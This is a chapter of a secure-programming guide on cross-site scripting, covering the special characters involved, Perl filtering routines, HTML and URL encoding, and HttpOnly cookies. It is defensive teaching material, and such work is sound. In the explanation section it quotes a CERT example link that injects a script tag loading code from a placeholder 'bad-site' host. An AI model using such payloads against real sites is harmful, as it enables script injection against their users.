<H1 class=SECT1><A name=CROSS-SITE-MALICIOUS-CONTENT>7.15. Prevent Cross-Site (XSS) Malicious Content</A></H1>
<P>Some secure programs accept data from one untrusted user (the attacker) and pass that data on to a different user's application (the victim). If the secure program doesn't protect the victim, the victim's application (e.g., their web browser) may then process that data in a way harmful to the victim. This is a particularly common problem for web applications using HTML or XML, where the problem goes by several names including ``cross-site scripting'', ``malicious HTML tags'', and ``malicious content.'' This book will call this problem ``cross-site malicious content,'' since the problem isn't limited to scripts or HTML, and its cross-site nature is fundamental. Note that this problem isn't limited to web applications, but since this is a particular problem for them, the rest of this discussion will emphasize web applications. As will be shown in a moment, sometimes an attacker can cause a victim to send data from the victim to the secure program, so the secure program must protect the victim from himself.</P>
<DIV class=SECT2>
<H2 class=SECT2><A name=EXPLAIN-CROSS-SITE>7.15.1. Explanation of the Problem</A></H2>
<P>Let's begin with a simple example. Some web applications are designed to permit HTML tags in data input from users that will later be posted to other readers (e.g., in a guestbook or ``reader comment'' area). If nothing is done to prevent it, these tags can be used by malicious users to attack other users by inserting scripts, Java references (including references to hostile applets), DHTML tags, early document endings (via &lt;/HTML&gt;), absurd font size requests, and so on. This capability can be exploited for a wide range of effects, such as exposing SSL-encrypted connections, accessing restricted web sites via the client, violating domain-based security policies, making the web page unreadable, making the web page unpleasant to use (e.g., via annoying banners and offensive material), permit privacy intrusions (e.g., by inserting a web bug to learn exactly who reads a certain page), creating denial-of-service attacks (e.g., by creating an ``infinite'' number of windows), and even very destructive attacks (by inserting attacks on security vulnerabilities such as scripting languages or buffer overflows in browsers). By embedding malicious FORM tags at the right place, an intruder may even be able to trick users into revealing sensitive information (by modifying the behavior of an existing form). Or, by embedding scripts, an intruder can cause no end of problems. This is by no means an exhaustive list of problems, but hopefully this is enough to convince you that this is a serious problem.</P>
<P>Most ``discussion boards'' have already discovered this problem, and most already take steps to prevent it in text intended to be part of a multiperson discussion. Unfortunately, many web application developers don't realize that this is a much more general problem.<SPAN class=Apple-converted-space>&nbsp;</SPAN><EM>Every</EM><SPAN class=Apple-converted-space>&nbsp;</SPAN>data value that is sent from one user to another can potentially be a source for cross-site malicious posting, even if it's not an ``obvious'' case of an area where arbitrary HTML is expected. The malicious data can even be supplied by the user himself, since the user may have been fooled into supplying the data via another site. Here's an example (from CERT) of an HTML link that causes the user to send malicious data to another site:
<TABLE width="100%" bgColor=#e0e0e0 border=0>
<TBODY>
<TR>
<TD><FONT color=#000000><PRE class=PROGRAMLISTING> &lt;A HREF="http://example.com/comment.cgi?mycomment=&lt;SCRIPT
 SRC='http://bad-site/badfile'&gt;&lt;/SCRIPT&gt;"&gt; Click here&lt;/A&gt;</PRE></FONT></TD></TR></TBODY></TABLE></P>
<P>In short, a web application cannot accept input (including any form data) without checking, filtering, or encoding it. You can't even pass that data back to the same user in many cases in web applications, since another user may have surreptitiously supplied the data. Even if permitting such material won't hurt your system, it will enable your system to be a conduit of attacks to your users. Even worse, those attacks will appear to be coming from your system.</P>
<P>CERT describes the problem this way in their advisory:<A name=AEN1424></A></P>
<BLOCKQUOTE class=BLOCKQUOTE>
<P>A web site may inadvertently include malicious HTML tags or script in a dynamically generated page based on unvalidated input from untrustworthy sources (<A href="http://www.cert.org/advisories/CA-2000-02.html" target=_top>CERT Advisory CA-2000-02, Malicious HTML Tags Embedded in Client Web Requests</A>).</P></BLOCKQUOTE>More information from CERT about this is available at<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.cert.org/archive/pdf/cross_site_scripting.pdf" target=_top>http://www.cert.org/archive/pdf/cross_site_scripting.pdf</A>.

<DIV class=SECT2>
<H2 class=SECT2><A name=SOLUTIONS-CROSS-SITE>7.15.2. Solutions to Cross-Site Malicious Content</A></H2>
<P>Fundamentally, this means that all web application output impacted by any user must be filtered (so characters that can cause this problem are removed), encoded (so the characters that can cause this problem are encoded in a way to prevent the problem), or validated (to ensure that only ``safe'' data gets through). This includes all output derived from input such as URL parameters, form data, cookies, database queries, CORBA ORB results, and data from users stored in files. In many cases, filtering and validation should be done at the input, but encoding can be done during either input validation or output generation. If you're just passing the data through without analysis, it's probably better to encode the data on input (so it won't be forgotten). However, if your program processes the data, it can be easier to encode it on output instead. CERT recommends that filtering and encoding be done during data output; this isn't a bad idea, but there are many cases where it makes sense to do it at input instead. The critical issue is to make sure that you cover all cases for every output, which is not an easy thing to do regardless of approach.</P>
<P>Warning - in many cases these techniques can be subverted unless you've also gained control over the character encoding of the output. Otherwise, an attacker could use an ``unexpected'' character encoding to subvert the techniques discussed here. Thankfully, this isn't hard; gaining control over output character encoding is discussed in<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/output-character-encoding.html">Section 9.5</A>.</P>
<P>One minor defense, that's often worth doing, is the "HttpOnly" flag for cookies. Scripts that run in a web browser cannot access cookie values that have the HttpOnly flag set (they just get an empty value instead). This is currently implemented in Microsoft Internet Explorer, and I expect Mozilla/Netscape to implement this soon too. You should set HttpOnly on for any cookie you send, unless you have scripts that need the cookie, to counter certain kinds of cross-site scripting (XSS) attacks. However, the HttpOnly flag can be circumvented in a variety of ways, so using as your primary defense is inappropriate. Instead, it's a helpful secondary defense that may help save you in case your application is written incorrectly.</P>
<P>The first subsection below discusses how to identify special characters that need to be filtered, encoded, or validated. This is followed by subsections describing how to filter or encode these characters. There's no subsection discussing how to validate data in general, however, for input validation in general see<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/input.html">Chapter 5</A>, and if the input is straight HTML text or a URI, see<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html">Section 5.11</A>. Also note that your web application can receive malicious cross-postings, so non-queries should forbid the GET protocol (see<A href="http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-get-non-queries.html">Section 5.12</A>).</P>
<DIV class=SECT3>
<H3 class=SECT3><A name=AEN1438>7.15.2.1. Identifying Special Characters</A></H3>
<P>Here are the special characters for a variety of circumstances (my thanks to the CERT, who developed this list):</P>
<P></P>
<UL>
<LI>
<P>In the content of a block-level element (e.g., in the middle of a paragraph of text in HTML or a block in XML):</P>
<P></P>
<UL>
<LI>
<P>"&lt;" is special because it introduces a tag.</P></LI>
<LI>
<P>"&amp;" is special because it introduces a character entity.</P></LI>
<LI>
<P>"&gt;" is special because some browsers treat it as special, on the assumption that the author of the page really meant to put in an opening "&lt;", but omitted it in error.</P></LI></UL>
<P></P></LI>
<LI>
<P>In attribute values:</P>
<P></P>
<UL>
<LI>
<P>In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value.</P></LI>
<LI>
<P>In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. XML's definition allows single quotes, but I've been told that some XML parsers don't handle them correctly, so you might avoid using single quotes in XML.</P></LI>
<LI>
<P>Attribute values without any quotes make the white-space characters such as space and tab special. Note that these aren't legal in XML either,<SPAN class=Apple-converted-space>&nbsp;</SPAN><EM>and</EM><SPAN class=Apple-converted-space>&nbsp;</SPAN>they make more characters special. Thus, I recommend against unquoted attributes if you're using dynamically generated values in them.</P></LI>
<LI>
<P>"&amp;" is special when used in conjunction with some attributes because it introduces a character entity.</P></LI></UL>
<P></P></LI>
<LI>
<P>In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL. When this is done, it introduces additional special characters:</P>
<P></P>
<UL>
<LI>
<P>Space, tab, and new line are special because they mark the end of the URL.</P></LI>
<LI>
<P>"&amp;" is special because it introduces a character entity or separates CGI parameters.</P></LI>
<LI>
<P>Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) aren't allowed in URLs, so they are all special here.</P></LI>
<LI>
<P>The "%" must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. The percent must be filtered if input such as "%68%65%6C%6C%6F" becomes "hello" when it appears on the web page in question.</P></LI></UL>
<P></P></LI>
<LI>
<P>Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt; the semicolon, parenthesis, curly braces, and new line should be filtered in situations where text could be inserted directly into a preexisting script tag.</P></LI>
<LI>
<P>Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (") on output might require additional filtering.</P></LI></UL>
<P></P>
<P>Note that, in general, the ampersand (&amp;) is special in HTML and XML.</P></DIV>
<DIV class=SECT3>
<H3 class=SECT3><A name=AEN1479>7.15.2.2. Filtering</A></H3>
<P>One approach to handling these special characters is simply eliminating them (usually during input or output).</P>
<P>If you're already validating your input for valid characters (and you generally should), this is easily done by simply omitting the special characters from the list of valid characters. Here's an example in Perl of a filter that only accepts legal characters, and since the filter doesn't accept any special characters other than the space, it's quite acceptable for use in areas such as a quoted attribute:
<TABLE width="100%" bgColor=#e0e0e0 border=0>
<TBODY>
<TR>
<TD><FONT color=#000000><PRE class=PROGRAMLISTING> # Accept only legal characters:
 $summary =~ tr/A-Za-z0-9\ \.\://dc;</PRE></FONT></TD></TR></TBODY></TABLE></P>
<P>However, if you really want to strip away<SPAN class=Apple-converted-space>&nbsp;</SPAN><EM>only</EM><SPAN class=Apple-converted-space>&nbsp;</SPAN>the smallest number of characters, then you could create a subroutine to remove just those characters:
<TABLE width="100%" bgColor=#e0e0e0 border=0>
<TBODY>
<TR>
<TD><FONT color=#000000><PRE class=PROGRAMLISTING> sub remove_special_chars {
  local($s) = @_;
  $s =~ s/[\&lt;\&gt;\"\'\%\;\(\)\&amp;\+]//g;
  return $s;
 }
 # Sample use:
 $data = &amp;remove_special_chars($data);</PRE></FONT></TD></TR></TBODY></TABLE></P></DIV>
<DIV class=SECT3>
<H3 class=SECT3><A name=AEN1487>7.15.2.3. Encoding (Quoting)</A></H3>
<P>An alternative to removing the special characters is to encode them so that they don't have any special meaning. This has several advantages over filtering the characters, in particular, it prevents data loss. If the data is "mangled" by the process from the user's point of view, at least when the data is encoded it's possible to reconstruct the data that was originally sent.</P>
<P>HTML, XML, and SGML all use the ampersand ("&amp;") character as a way to introduce encodings in the running text; this encoding is often called ``HTML encoding.'' To encode these characters, simply transform the special characters in your circumstance. Usually this means '&lt;' becomes '&amp;lt;', '&gt;' becomes '&amp;gt;', '&amp;' becomes '&amp;amp;', and '"' becomes '&amp;quot;'. As noted above, although in theory '&gt;' doesn't need to be quoted, because some browsers act on it (and fill in a '&lt;') it needs to be quoted. There's a minor complexity with the double-quote character, because '&amp;quot;' only needs to be used inside attributes, and some extremely old browsers don't properly render it. If you can handle the additional complexity, you can try to encode '"' only when you need to, but it's easier to simply encode it and ask users to upgrade their browsers. Few users will use such ancient browsers, and the double-quote character encoding has been a standard for a long time.</P>
<P>Scripting languages may consider implementing specialized auto-quoting types, the interesting approach developed in the web application framework<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.mems-exchange.org/software/quixote" target=_top>Quixote</A>. Quixote includes a "template" feature which allows easy mixing of HTML text and Python code; text generated by a template is passed back to the web browser as an HTML document. As of version 0.6, Quixote has two kinds of text (instead of a single kind as most such languages). Anything which appears in a literal, quoted string is of type "htmltext," and it is assumed to be exactly as the programmer wanted it to be (this is reasoble, since the programmer wrote it). Anything which takes the form of an ordinary Python string, however, is automatically quoted as the template is executed. As a result, text from a database or other external source is automatically quoted, and cannot be used for a cross-site scripting attack. Thus, Quixote implements a safe default - programmers no longer need to worry about quoting every bit of text that passes through the application (bugs involving too much quoting are less likely to be a security problem, and will be obvious in testing). Quixote uses an open source software license, but because of its venue identification it is probably GPL-incompatible, and is used by organizations such as the<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://lwn.net/" target=_top>Linux Weekly News</A>.</P>
<P>This approach to HTML encoding isn't quite enough encoding in some circumstances. As discussed in<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/output-character-encoding.html">Section 9.5</A>, you need to specify the output character encoding (the ``charset''). If some of your data is encoded using a different character encoding than the output character encoding, then you'll need to do something so your output uses a consistent and correct encoding. Also, you've selected an output encoding other than ISO-8859-1, then you need to make sure that any alternative encodings for special characters (such as "&lt;") can't slip through to the browser. This is a problem with several character encodings, including popular ones like UTF-7 and UTF-8; see<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/character-encoding.html">Section 5.9</A><SPAN class=Apple-converted-space>&nbsp;</SPAN>for more information on how to prevent ``alternative'' encodings of characters. One way to deal with incompatible character encodings is to first translate the characters internally to ISO 10646 (which has the same character values as Unicode), and then using either numeric character references or character entity references to represent them:</P>
<P></P>
<UL>
<LI>
<P>A numeric character reference looks like "&amp;#D;", where D is a decimal number, or "&amp;#xH;" or "&amp;#XH;", where H is a hexadecimal number. The number given is the ISO 10646 character id (which has the same character values as Unicode). Thus &amp;#1048; is the Cyrillic capital letter "I". The hexadecimal system isn't supported in the SGML standard (ISO 8879), so I'd suggest using the decimal system for output. Also, although SGML specification permits the trailing semicolon to be omitted in some circumstances, in practice many systems don't handle it - so always include the trailing semicolon.</P></LI>
<LI>
<P>A character entity reference does the same thing but uses mnemonic names instead of numbers. For example, "&amp;lt;" represents the &lt; sign. If you're generating HTML, see the<A href="http://www.w3.org/" target=_top>HTML specification</A><SPAN class=Apple-converted-space>&nbsp;</SPAN>which lists all mnemonic names.</P></LI></UL>Either system (numeric or character entity) works; I suggest using character entity references for '&lt;', '&gt;', '&amp;', and '"' because it makes your code (and output) easier for humans to understand. Other than that, it's not clear that one or the other system is uniformly better. If you expect humans to edit the output by hand later, use the character entity references where you can, otherwise I'd use the decimal numeric character references just because they're easier to program. This encoding scheme can be quite inefficient for some languages (especially Asian languages); if that is your primary content, you might choose to use a different character encoding (charset), filter on the critical characters (e.g., "&lt;") and ensure that no alternative encodings for critical characters are allowed.
<P></P>
<P>URIs have their own encoding scheme, commonly called ``URL encoding.'' In this system, characters not permitted in URLs are represented using a percent sign followed by its two-digit hexadecimal value. To handle all of ISO 10646 (Unicode), it's recommended to first translate the codes to UTF-8, and then encode it. See<SPAN class=Apple-converted-space>&nbsp;</SPAN><A href="http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html#VALIDATING-URIS">Section 5.11.4</A><SPAN class=Apple-converted-space>&nbsp;</SPAN>for more about validating URIs.</P></DIV></DIV></DIV>
